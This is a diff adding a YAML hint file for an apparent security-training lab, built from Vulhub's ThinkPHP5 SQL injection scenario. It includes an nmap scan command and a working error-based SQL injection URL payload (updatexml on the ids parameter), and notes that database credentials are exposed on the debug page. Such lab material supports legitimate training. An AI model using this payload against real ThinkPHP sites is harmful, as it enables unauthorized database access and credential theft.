@@ -1,0 +1,65 @@
+# Optional ScenarioForge guide hints; derived from the adjacent public Vulhub documentation.
+schema_version: 1
+match: thinkphp/in-sqlinjection
+hint_levels:
+  low:
+  - Inspect the thinkphp service or application on {{NODE_NAME}} @ {{NODE_IP}}.
+  medium:
+  - |-
+    Catalog TCP ports: 80. Identify the exposed services:
+
+    ```bash
+    nmap -Pn -sT -sV -p 80 {{NODE_IP}}
+    ```
+  - 'Catalog port mappings (published → container): web: 80/tcp → container 80/tcp. These are recipe defaults; use
+    the deployed service port if the scenario remaps it.'
+  - 'Documented target URL(s): `http://{{NODE_IP}}/index.php`.'
+  high:
+  - 'Vulnerability: ThinkPHP5 SQL Injection Vulnerability && Sensitive Information Disclosure Vulnerability.'
+  - |-
+    Exploit
+
+    Open the page `http://{{NODE_IP}}/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1`，you will find messages revealed successfully：
+
+    Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/thinkphp/in-sqlinjection/01.png
+
+    And you can find the account and password of the database through the debug page.
+
+    Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/thinkphp/in-sqlinjection/02.png
+
+    This is another sensitive information disclosure vulnerability.
+  - 'Publicly available documentation: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/thinkphp/in-sqlinjection/README.md'
+access_instructions:
+  title: ThinkPHP5 SQL Injection Vulnerability && Sensitive Information Disclosure Vulnerability
+  steps:
+  - title: Locate the target service
+    instructions: |-
+      Catalog TCP ports: 80. Identify the exposed services:
+
+      ```bash
+      nmap -Pn -sT -sV -p 80 {{NODE_IP}}
+      ```
+
+      Catalog port mappings (published → container): web: 80/tcp → container 80/tcp. These are recipe defaults; use the deployed service port if the scenario remaps it.
+
+      Documented target URL(s): `http://{{NODE_IP}}/index.php`.
+  - title: Exploit
+    instructions: |-
+      Open the page `http://{{NODE_IP}}/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1`，you will find messages revealed successfully：
+
+      Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/thinkphp/in-sqlinjection/01.png
+
+      And you can find the account and password of the database through the debug page.
+
+      Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/thinkphp/in-sqlinjection/02.png
+
+      This is another sensitive information disclosure vulnerability.
+guidance_source:
+  repository: https://github.com/vulhub/vulhub
+  snapshot_commit: 3af973a39bd0988f288a53fa9ea4b82372774e58
+  documentation_url: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/thinkphp/in-sqlinjection/README.md
+  readme_sha256: 593bf5259dff03869911be21af123df612cb90fef3d89146af94f3ea7b9268b1
+  compose_sha256: a8a1900f80f36b02b94ecf5e697ad8f422973b59779fb7196457c783be3018c7
+  license: MIT; see vulnhub/content/LICENSE
+  method: Tiered discovery hints and adapted reproduction text from the local catalog snapshot. Reproduction commands
+    have not been executed.
